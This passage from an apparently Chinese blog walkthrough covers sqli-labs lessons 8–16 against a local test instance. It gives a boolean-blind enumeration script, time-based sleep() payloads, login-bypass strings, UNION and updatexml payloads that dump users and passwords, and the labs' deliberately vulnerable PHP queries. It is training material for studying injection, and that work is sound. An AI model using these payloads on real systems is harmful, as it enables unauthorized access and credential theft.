+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> turtle <span class="keyword">import</span> ht</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://127.0.0.1/Less-8/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库名长度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_len</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        payload = <span class="string">&quot;?id=1&#x27; and length(database())=&#123;0&#125;--+&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        r = requests.get(URL + payload)</span><br><span class="line">        <span class="comment"># 这里改了判断内容长度</span></span><br><span class="line">        <span class="keyword">if</span>(r.headers[<span class="string">&#x27;Content-Length&#x27;</span>])!=<span class="string">&#x27;442&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库名</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name</span>(<span class="params">length</span>):</span><br><span class="line">    name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">            char = <span class="built_in">chr</span>(<span class="number">97</span>+j)</span><br><span class="line">            payload = <span class="string">&quot;?id=1&#x27; and substring(database(),&#123;0&#125;,1)\</span></span><br><span class="line"><span class="string">                =&#x27;&#123;1&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(i,char)</span><br><span class="line">            r = requests.get(URL + payload)</span><br><span class="line">            <span class="comment"># 这里也改了</span></span><br><span class="line">            <span class="keyword">if</span>(r.headers[<span class="string">&#x27;Content-Length&#x27;</span>])!=<span class="string">&#x27;442&#x27;</span>:</span><br><span class="line">                name += char</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(db_name(db_len()))</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+<p>其余的也与Lesson-5相同，不再赘述<br>但由于错误不会返回任何信息，Lesson5中用到的<code>xmlupdate()</code>的思路也不能用</p>
+<h1 id="Lesson-9"><a href="#Lesson-9" class="headerlink" title="Lesson 9"></a>Lesson 9</h1><p><strong>GET - Blind - Time based. - Single Quotes (基于时间的GET单引号盲注)</strong><br>这里无论输入是否合法都只会显示下面的页面：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221133855.png"><br>但是并没有ban掉sleep函数，结合题目，是基于时间的盲注，构造如下的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-9/?id=1&#x27; and if(length(database())=8,sleep(5),1) --+</span><br></pre></td></tr></table></figure>
+<p>当语句正确时延迟五秒：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221136669.png"><br>可以看到网页加载的时间，与语句不正确时有明显的的区别：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-9/?id=1&#x27; and if(length(database())=1,sleep(5),1) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221136133.png"><br>我们可以基于此来猜测库名表名数据等等<br>库名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-9/?id=1&#x27; and if(substr(database(),1,1)=&#x27;s&#x27;,sleep(5),1) --+</span><br></pre></td></tr></table></figure>
+<p>表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//第一个表名</span><br><span class="line">http://127.0.0.1/Less-9/?id=1&#x27; and if(substr((select table_name from information_schema.tables where table_schema = &#x27;security&#x27; limit 0，1),1,1)=&#x27;e&#x27;,sleep(5),1) --+</span><br><span class="line"></span><br><span class="line">//第二个表名</span><br><span class="line">http://127.0.0.1/Less-9/?id=1&#x27; and if(substr((select table_name from information_schema.tables where table_schema = &#x27;security&#x27; limit 0，1),1,1)=&#x27;r&#x27;,sleep(5),1) --+</span><br></pre></td></tr></table></figure>
+<p>列名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//第一个列名</span><br><span class="line">http://127.0.0.1/Less-9/?id=1&#x27; and if(substr((select column_name from information_schema.columns where table_name = &#x27;users&#x27; limit 0,1),1,1)=&#x27;i&#x27;,sleep(5),1) --+</span><br><span class="line"></span><br><span class="line">//第二个列名</span><br><span class="line">http://127.0.0.1/Less-9/?id=1&#x27; and if(substr((select column_name from information_schema.columns where table_name = &#x27;users&#x27; limit 1,1),1,1)=&#x27;u&#x27;,sleep(5),1) --+</span><br></pre></td></tr></table></figure>
+<p>数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//username</span><br><span class="line">http://127.0.0.1/Less-9/?id=1&#x27; and if(substr((select username from users limit 0,1),1,1)=&#x27;D&#x27;,sleep(5),1) --+</span><br><span class="line"></span><br><span class="line">//password</span><br><span class="line">http://127.0.0.1/Less-9/?id=1&#x27; and if(substr((select password from users limit 0,1),1,1)=&#x27;D&#x27;,sleep(5),1) --+</span><br></pre></td></tr></table></figure>
+
+<h1 id="Lesson-10"><a href="#Lesson-10" class="headerlink" title="Lesson 10"></a>Lesson 10</h1><p><strong>GET - Blind - Time based - double quotes (基于时间的双引号盲注)</strong><br>与Lesson9的唯一区别是闭合方式从单引号改为双引号，其余都一样，稍微修改一下payload就好</p>
+<h1 id="Lesson-11"><a href="#Lesson-11" class="headerlink" title="Lesson 11"></a>Lesson 11</h1><p><strong>POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)</strong><br>打开题目，映入眼帘的是一个提交框<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221509557.png"><br>是一道基于POST方法的题目，结合题目，单引号报错型，ok，那第一步要先抓个包看一下提交的参数名是什么，如下：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221506907.png"><br>接着在浏览器hackbar插件里面用POST方法提交就好了：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221515469.png"><br>构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and 1=1 --+&amp;passwd=whatever</span><br></pre></td></tr></table></figure>
+<p>这里是POST提交的数据，先用单引号将<code>uname=admin</code>闭合，然后和一个恒真语句相与，并将后面的<code>passwd</code>字段注释掉，这样服务器收到的并执行的语句就是这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;admin&#x27; and 1=1 --+&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>直接登录成功：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221523318.png"><br>这也是一些后台万能密码的原理，其他的一些万能密码如下：</p>
+<ul>
+<li>  <code>admin&#39; --</code></li>
+<li>  <code>admin&#39; #</code></li>
+<li>  <code>admin&#39;/*</code></li>
+<li>  <code>&#39; or 1=1--</code></li>
+<li>  <code>&#39; or 1=1#</code></li>
+<li>  <code>&#39; or 1=1/*</code></li>
+<li>  <code>&#39;) or &#39;1&#39;=&#39;1--</code></li>
+<li>  <code>&#39;) or (&#39;1&#39;=&#39;1--</code><br>登录进来后，查一下列数：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; order by 3  --+&amp;passwd=whatever</span><br></pre></td></tr></table></figure>
+到3时报错<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221534256.png"><br>暴库，这里找了个不存在的账号，否则不会显示union select出的内容：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&#x27; union select 1,database() --+&amp;passwd=whatever</span><br></pre></td></tr></table></figure>
+<img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221536572.png"><br>爆表：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27;  --+&amp;passwd=whatever</span><br></pre></td></tr></table></figure>
+<img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221539805.png"><br>爆字段：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name= &#x27;users&#x27;  --+&amp;passwd=whatever</span><br></pre></td></tr></table></figure>
+<img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221540428.png"><br>爆用户名：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&#x27; union select 1,username from security.users limit 0,1  --+&amp;passwd=whatever</span><br></pre></td></tr></table></figure>
+递增<code>limit 0,1</code>第一个参数的值枚举数据<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221543645.png"><br>同理爆密码：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&#x27; union select 1,password from security.users limit 2,1  --+&amp;passwd=whatever</span><br></pre></td></tr></table></figure>
+<img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221544030.png"></li>
+</ul>
+<h2 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line">	<span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">	<span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;User Name:&#x27;</span>.<span class="variable">$uname</span>);</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;Password:&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// connectivity </span></span><br><span class="line">	@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27;\</span></span><br><span class="line"><span class="string">	 and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">	<span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure>
+<h1 id="Lesson-12"><a href="#Lesson-12" class="headerlink" title="Lesson 12"></a>Lesson 12</h1><p><strong>POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)</strong><br>加个双引号先尝试一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot; &amp;passwd=whatever</span><br></pre></td></tr></table></figure>
+<p>报错，发现还要闭合一个括号：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221619153.png"><br>加个括号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;) --+ &amp;passwd=whatever</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221620720.png"><br>登录成功，其余同Lesson11，不再赘述</p>
+<h2 id="源码-4"><a href="#源码-4" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// connectivity</span></span><br><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=\</span></span><br><span class="line"><span class="string">(&quot;</span><span class="variable">$uname</span><span class="string">&quot;) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure>
+<h1 id="Lesson-13"><a href="#Lesson-13" class="headerlink" title="Lesson 13"></a>Lesson 13</h1><p><strong>POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)</strong><br>尝试一下单引号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; &amp;passwd=whatever</span><br></pre></td></tr></table></figure>
+<p>报错：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221626113.png"><br>发现还需要闭合一个单引号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;) --+&amp;passwd=whatever</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221627265.png"><br>显示登录成功，但没有显示具体的信息，推测是盲注，测试一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;) and if(length(database())=1,1,0)--+&amp;passwd=whatever</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221629192.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;) and if(length(database())=8,1,0)--+&amp;passwd=whatever</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221629330.png"><br>嗯，果然是，但是此处受Lesson5的启发，尝试一下基于<code>xmlupdate()</code>的报错注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;) and updatexml(1,concat(0x7e,database(),0x7e),1)--+&amp;passwd=whatever</span><br></pre></td></tr></table></figure>
+<p>成功：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221632785.png"><br>剩下的就和Lesson 5一样了，不再赘述</p>
+<h2 id="源码-5"><a href="#源码-5" class="headerlink" title="源码"></a>源码</h2><p>//注意源码注释了显示用户名和密码信息的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(&#x27;<span class="subst">$uname</span>&#x27;)\</span></span><br><span class="line"><span class="string"> and password=(&#x27;<span class="subst">$passwd</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line"> 		<span class="comment">//echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;;	</span></span><br><span class="line"> 		</span><br><span class="line"> 		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">	<span class="comment">//echo &quot; You Have successfully logged in &quot; ;</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	<span class="comment">//echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];</span></span><br><span class="line">	<span class="comment">//echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line">	<span class="comment">//echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];</span></span><br><span class="line">	<span class="comment">//echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;   /&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line"> 		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line"> 	&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="Lesson-14"><a href="#Lesson-14" class="headerlink" title="Lesson 14"></a>Lesson 14</h1><p><strong>POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)</strong><br>尝试了一下单引号发现没用，双引号闭合登录成功：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot; --+&amp;passwd=whatever</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221651811.png"><br>但是没有显示信息，只能用盲注：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot; and if(length(database())=1,1,0) --+&amp;passwd=whatever</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221652256.png"><br>其余与Lesson 13一样，再试一下xmlupdate报错注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot; and updatexml(1,concat(0x7e,database(),0x7e),1)--+&amp;passwd=whatever</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221654221.png"><br>成功，其余与Lesson13同</p>
+<h2 id="源码-6"><a href="#源码-6" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=\</span></span><br><span class="line"><span class="string"><span class="subst">$uname</span> and password=<span class="subst">$passwd</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure>
+<h1 id="Lesson-15"><a href="#Lesson-15" class="headerlink" title="Lesson 15"></a>Lesson 15</h1><p><strong>POST - Blind- Boolian/time Based - Single quotes (基于bool型/时间延迟单引号POST型盲注)</strong><br>加单引号尝试一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; --+&amp;passwd=whatever</span><br></pre></td></tr></table></figure>
+<p>登录成功：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221721247.png"><br>尝试报错注入后，发现没有任何回显，直接bool盲注，根据是否登录成功来判断条件是否正确：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and if(length(database())=1,1,0) --+&amp;passwd=whatever</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221725996.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and if(length(database())=8,1,0) --+&amp;passwd=whatever</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221725819.png"><br>基于此修改Lesson 5的枚举脚本就即可得到数据</p>
+<h2 id="源码-7"><a href="#源码-7" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username\</span></span><br><span class="line"><span class="string">=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line"> 		<span class="comment">//echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;;	</span></span><br><span class="line"> 		</span><br><span class="line"> 		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">	<span class="comment">//echo &quot; You Have successfully logged in\n\n &quot; ;</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	<span class="comment">//echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	<span class="comment">//echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line"> 		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line"> 	&#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+<h1 id="Lesson-16"><a href="#Lesson-16" class="headerlink" title="Lesson 16"></a>Lesson 16</h1><p><strong>POST - Blind- Boolian/Time Based - Double quotes (基于bool型/时间延迟的双引号POST型盲注)</strong><br>除了闭合方式从<code>&#39;</code>闭合变为<code>&quot;)</code>闭合外，与Lesson15一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;) and if(length(database())=8,1,0) --+&amp;passwd=whatever</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210221725819.png"></p>
